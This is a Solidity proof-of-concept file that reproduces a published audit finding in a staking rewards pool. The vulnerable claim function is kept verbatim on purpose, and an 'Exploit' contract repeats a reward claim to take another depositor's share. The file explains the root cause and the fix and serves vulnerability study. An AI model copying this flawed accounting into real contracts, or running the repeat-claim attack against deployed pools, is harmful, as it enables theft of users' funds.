// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Stakehouse Protocol — incorrect accounting in `SyndicateRewardsProcessor`
    results in any LP token holder being able to steal other LP token
    holders' ETH from the fees and MEV vault
    (Code4rena 2022-11-stakehouse, #43032, H-09)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable `_distributeETHRewardsToUserForToken` body is inlined VERBATIM
    — including the `claimed[_user][_token] = due;` assignment that should be
    `+=`. Two depositors share a pool across two reward rounds; the first
    depositor legitimately claims both rounds (all set up before `run()`),
    then calls `claimRewards` a THIRD time with no new reward having arrived
    and is paid AGAIN — pure theft from the other depositor's share (no fork,
    no cheats).
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: `_distributeETHRewardsToUserForToken` computes `due` as the
    difference between the user's total accrued entitlement and their
    previously recorded `claimed[_user][_token]`, then does:

        claimed[_user][_token] = due;

    This SETS the ledger to the amount JUST paid, discarding the fact that a
    previous claim already paid `claimed[_user][_token]`'s OLD value. The
    ledger no longer reflects the user's true cumulative claimed amount, so
    the NEXT computation of `due` under-subtracts and pays out an amount the
    user is not entitled to. Repeating the claim call (with or without new
    rewards) keeps paying the same `due` again and again until the vault is
    drained.

    Recommended fix (per report): `claimed[_user][_token] += due;`
//////////////////////////////////////////////////////////////*/

/// @dev Reduced abstract reward-accounting base — faithful reduction of
///      contracts/liquid-staking/SyndicateRewardsProcessor.sol. This is
///      where the blamed line lives.
abstract contract SyndicateRewardsProcessor {
    uint256 public constant PRECISION = 1e24;
    uint256 public accumulatedETHPerLPShare;
    uint256 public totalClaimed;
    uint256 public totalETHSeen;
    mapping(address => mapping(address => uint256)) public claimed;

    /// @dev VERBATIM reduction of
    ///      SyndicateRewardsProcessor._distributeETHRewardsToUserForToken
    ///      (contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L63).
    function _distributeETHRewardsToUserForToken(
        address _user,
        address _token,
        uint256 _balance,
        address _recipient
    ) internal {
        require(_recipient != address(0), "Zero address");
        uint256 balance = _balance;
        if (balance > 0) {
            // Calculate how much ETH rewards the address is owed / due
            uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];
            if (due > 0) {
                claimed[_user][_token] = due; // @> VULN: should be `+= due` — this DISCARDS the previously recorded cumulative claim
                totalClaimed += due;
                (bool success, ) = _recipient.call{value: due}("");
                require(success, "Failed to transfer");
            }
        }
    }

    function _updateAccumulatedETHPerLP(uint256 _numOfShares) internal {
        if (_numOfShares > 0) {
            uint256 received = totalRewardsReceived();
            uint256 unprocessed = received - totalETHSeen;
            if (unprocessed > 0) {
                accumulatedETHPerLPShare += (unprocessed * PRECISION) / _numOfShares;
                totalETHSeen = received;
            }
        }
    }

    function totalRewardsReceived() public view virtual returns (uint256) {
        return address(this).balance + totalClaimed;
    }

    receive() external payable {}
}

/// @notice Reduced Giant Pool — faithful reduction of `GiantPoolBase` +
///         `GiantMevAndFeesPool` (contracts/liquid-staking/). Keeps
///         `depositETH` and a reduced `claimRewards` (the nested
///         `StakingFundsVault[]` loop from the real
///         `GiantMevAndFeesPool.claimRewards` is omitted — it does not
///         affect this bug, which lives entirely in the final
///         `_distributeETHRewardsToUserForToken` call).
contract GiantMevAndFeesPool is SyndicateRewardsProcessor {
    uint256 public constant MIN_STAKING_AMOUNT = 0.001 ether;
    uint256 public idleETH;

    mapping(address => uint256) public lpBalanceOf;
    uint256 public lpTotalSupply;

    function depositETH(uint256 _amount) public payable {
        require(msg.value >= MIN_STAKING_AMOUNT, "Minimum not supplied");
        require(msg.value == _amount, "Value equal to amount");

        idleETH += msg.value;
        lpBalanceOf[msg.sender] += msg.value;
        lpTotalSupply += msg.value;
        _setClaimedToMax(msg.sender);
    }

    /// @dev Reduced `GiantMevAndFeesPool.claimRewards`
    ///      (contracts/liquid-staking/GiantMevAndFeesPool.sol#L60-L78) — the
    ///      real function first loops over `StakingFundsVault[]` to pull in
    ///      rewards from sub-vaults; that loop is omitted here (irrelevant to
    ///      the bug). `updateAccumulatedETHPerLP` + the final
    ///      `_distributeETHRewardsToUserForToken` call are VERBATIM.
    function claimRewards(address _recipient) external {
        updateAccumulatedETHPerLP();

        _distributeETHRewardsToUserForToken(
            msg.sender,
            address(this),
            lpBalanceOf[msg.sender],
            _recipient
        );
    }

    function updateAccumulatedETHPerLP() public {
        _updateAccumulatedETHPerLP(lpTotalSupply);
    }

    /// @dev Verbatim override — contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178.
    function totalRewardsReceived() public view override returns (uint256) {
        return address(this).balance + totalClaimed - idleETH;
    }

    function _setClaimedToMax(address _user) internal {
        claimed[_user][address(this)] = (accumulatedETHPerLPShare * lpBalanceOf[_user]) / PRECISION;
    }
}

/// @dev A depositor. Holds ETH (funded before `run()` via the Playground's
///      unrecorded setup step) and can deposit/claim through the pool. Tracks
///      its own cumulative received ETH independent of `address(this).balance`
///      so the harm assertion doesn't depend on gas-accounting assumptions.
contract Depositor {
    uint256 public totalReceived;

    function deposit(GiantMevAndFeesPool _pool, uint256 _amount) external {
        _pool.depositETH{value: _amount}(_amount);
    }

    function claim(GiantMevAndFeesPool _pool, address _recipient) external {
        _pool.claimRewards(_recipient);
    }

    receive() external payable {
        totalReceived += msg.value;
    }
}

/// @dev Orchestrator. Deploys the pool and two depositors. Depositors are
///      pre-funded via an UNRECORDED Playground setup step (mirrors
///      `vm.deal`); two full deposit + reward-donation + LEGITIMATE-claim
///      rounds also happen via unrecorded setup calls (mirrors ordinary prior
///      activity). `run()` performs ONLY the illegitimate THIRD claim — with
///      no new reward having arrived — isolating the theft itself.
contract Exploit {
    GiantMevAndFeesPool public pool; // nonce 1
    Depositor public userA; // nonce 2 — repeat-claims, extracts more than their fair share
    Depositor public userB; // nonce 3 — honest depositor, never claims, is shorted

    uint256 public constant DEPOSIT_AMOUNT = 2 ether;
    uint256 public constant REWARD_ROUND = 1.2 ether;

    constructor() {
        pool = new GiantMevAndFeesPool(); // CREATE nonce 1
        userA = new Depositor(); // CREATE nonce 2
        userB = new Depositor(); // CREATE nonce 3
    }

    /// @notice Both depositors have already deposited and userA has already
    ///         legitimately claimed two reward rounds (all via unrecorded
    ///         setup). Here, userA calls claimRewards a THIRD time with NO
    ///         new reward in between — and gets paid again anyway.
    function run() external {
        uint256 before = userA.totalReceived();

        // === attack: repeat the claim with no new reward since the last one ===
        userA.claim(pool, address(userA));

        uint256 gained = userA.totalReceived() - before;

        // HARM: the repeat claim pays out again despite zero new rewards
        // having arrived since userA's last (legitimate) claim.
        require(gained > 0, "repeat claim should have paid out despite no new reward");
        require(gained == 0.6 ether, "repeat claim steals exactly the previous round's due");

        // HARM: userA's cumulative claimed reward now EXCEEDS their fair
        // share of the total rewards the pool has ever seen. userA holds
        // exactly half the LP supply, so their fair share is totalETHSeen/2.
        uint256 fairShare = pool.totalETHSeen() / 2;
        require(userA.totalReceived() > fairShare, "userA extracted more than their fair share of total rewards");
    }
}
